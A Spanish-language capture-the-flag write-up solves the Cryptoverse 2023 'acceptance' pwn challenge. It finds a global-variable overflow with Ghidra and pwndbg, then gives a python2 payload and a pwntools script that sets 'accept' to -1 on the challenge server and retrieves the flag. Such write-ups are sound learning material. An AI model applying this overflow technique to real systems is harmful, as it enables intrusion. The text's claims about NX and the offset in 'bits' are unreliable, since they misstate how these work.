---
author: naibu3
---

# pwn - acceptance

Es el reto *easy* de la categoría *pwn* del *cryptoverse 2023*. La descriptción del reto es:


**Pwn/Acceptance**

Easy - 95 solves / 323 points

I want to go out but I need to ask my mom first. Help me guys!

`nc 20.169.252.240 4000`

Además nos dan un binario llamado `acceptance`.

----

## Reconocimiento

Comenzamos lanzando [[checksec]] y `file`:

```bash
file acceptance
```
```file
acceptance: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=75881c0c4011726772f5c71b56300328b383bf7b, for GNU/Linux 3.2.0, not stripped
```

```bash
checksec acceptance
```
```checksec
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

Vemos que se trata de un binario de 64-bits (`LSB`), y que tiene habilitada la protección *NX*, sin embargo no hay de qué preocuparse, ya que como el binario debemos explotarlo en un servidor, esta protección evita que alguien pueda acceder maliciosamente al mismo.

Si tratamos de ejecutarlo, veremos que nos pide ayuda para escaparse sin permiso de su madre. Si introducimos cualquier cosa, por ejemplo `hola`, nos da un mensaje de *error*:

```acceptance
I wanna go out but I need mom's permisison.
Help him: hola
Arg! Why don't you help me :((
```

Vamos a ver si el programa se rompe al introducir muchos carácteres:

```acceptance
I wanna go out but I need mom's permisison.
Help him: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
You ask a lot and she suspect me :((
```

Parece que el mensaje de error ha cambiado. Vamos a intentar descompilar el código con [[ghidra]]:

```c
undefined8 print_flag(void)
{
  uint *puVar1;
  undefined local_38 [44];
  int local_c;
  
  if (accept < 1) {
    if (accept == -1) {
      local_c = open("/home/me/flag.txt",0);
      if (local_c == -1) {
        puVar1 = (uint *)__errno_location();
        fprintf(stderr,"Error num %d\n",(ulong)*puVar1);
      }
      else {
        read(local_c,local_38,0x22);
        close(local_c);
        write(1,local_38,0x22);
        putchar(10);
      }
    }
    else {
      puts("Nah, You are a liar!");
    }
  }
  else {
    puts("You ask a lot and she suspect me :((");
  }
  return 0;
}
```
```c
undefined8 main(EVP_PKEY_CTX *param_1)
{
  init(param_1);
  puts("I wanna go out but I need mom\'s permisison.");
  printf("Help him: ");
  read(0,say,0x24);
  if (accept == 0) {
    puts("Arg! Why don\'t you help me :((");
  }
  else {
    print_flag();
  }
  return 0;
}
```

Vemos que hay una función `print_flag` además de `main`, y que sólo se llama si la variable `accept` es distinta de 0. Como el segundo output que hemos recibido es de la función `print_flag`, podemos pensar que al sobrepasar el tamaño de la variable `say`, hemos sobreescrito el valor de `accept`, llamando a `print_flag`.

### Prueba con gdb-pwndbg

Ahora, con [[gdb]]-[[pwndbg]] y python2, vamos a comprobar si nuestra teoría es cierta. Para ello, debemos encontrar a partir de qué número de carácteres se sobreescribe `accept`.

Si descompilamos `print_flag`, podemos ver la dirección de `accept`:

```gdb-pwndbg
disassemble print_flag
```
```gdb-pwndbg
0x00000000004011fd <+8>:	mov    eax,DWORD PTR [rip+0x2ecd]        # 0x4040d0 <accept>
```

En gdb-pwndbg utilizamos `cyclic` para generar una secuencia de letras. Establecemos un *break point* en `print_flag` y ejecutamos:

```gdb-pwndbg
cyclic 100
```
```cyclic
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```

```gdb-pwndbg
break print_flag
```

```gdb-pwndbg
run
```
```acceptance
I wanna go out but I need mom's permisison.
Help him: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```

Una vez detenidos en el *break point*, podemos ver el valor de `accept` con:

```gdb-pwndbg
x 0x4040d0    #Direccion de accept
```
```0x4040d0
0x4040d0 <accept>:	0x61616165
```

Si decodificamos ese valor, corresponde a `aaae`. Debemos tener en cuenta que como es *LSB* o *little-endian*, está al revés (los bits menos significativos a la izquierda). Por lo que dentro de la cadena de antes los digitos correspondientes a `accept` serían:

```
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaEAAAaaaa
```

Es decir 32 bits de *offset*, o de desplazamiento hasta `accept`. Vamos a probar a generar una cadena con python2:

```bash
python2 -c 'print 32*"a" + "BBBB"'
```
```payload
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBB
```

Si repetimos el procedimiento anterior pasando dicho payload, `accept` contiene:

```gdb-pwndbg
0x4040d0 <accept>:	0x42424242
```

Que si lo decodificamos es `BBBB`.


## Explotación (en local)

Como vimos al descompilar el código, para que se imprima la flag, `accept` debe valer `-1`. En 4 digitos hexadecimales sería `0xffffffff`, como no podemos copiar y pegar carácteres hexadecimales (por problemas de conversión), vamos a generar el payload con python2:

```bash
python2 -c 'print 32*"a" + "\xff\xff\xff\xff"' > payload
```
> Es la misma línea de antes pasando -1 en hexadecimal y redirigiendo la salida a un fichero.

Si probamos a ejecutar, debería salir algo así:

```bash
./acceptance < payload
```
```acceptance
I wanna go out but I need mom's permisison.
Help him: Error num 2
```

Esto se debe a que está tratando de listar el fichero `/home/me/flag.txt` pero no existe en nuestro equipo. Ya hemos conseguido resolver el reto en local!


## Explotación (server)

Como el binario corre en un servidor debemos explotarlo ahí para recuperar la flag. Todo el proceso lo haremos mediante un script en python3 con [[pwntools]]:

```python
#!/bin/python3

from pwn import *   # Import pwntools

nc = remote('20.169.252.240', 4000)   # Conexion con el server

line = nc.recvline()   # "I wanna go out but I need mom's permisison."
print(line)

nc.sendlineafter(b':', b'a'*32 + p64(0xffffffff))   # After "Help him:" sends payload (32*a + "-1") encoded 64-bit hex

print(nc.recvall().decode())   # Prints flag, decode is to remove b''

nc.close()   # Closes connection
```

Al ejecutarlo debería devolver:

```bash
./script.py
```
```acceptance
[+] Opening connection to 20.169.252.240 on port 4000: Done
b"I wanna go out but I need mom's permisison.\n"
[+] Receiving all data: Done (35B)
[*] Closed connection to 20.169.252.240 port 4000
 cvctf{Y34h_1_c4N_G0_n0w_tH4nK_y4u}
```

Enhorabuena! Has resuelto el reto!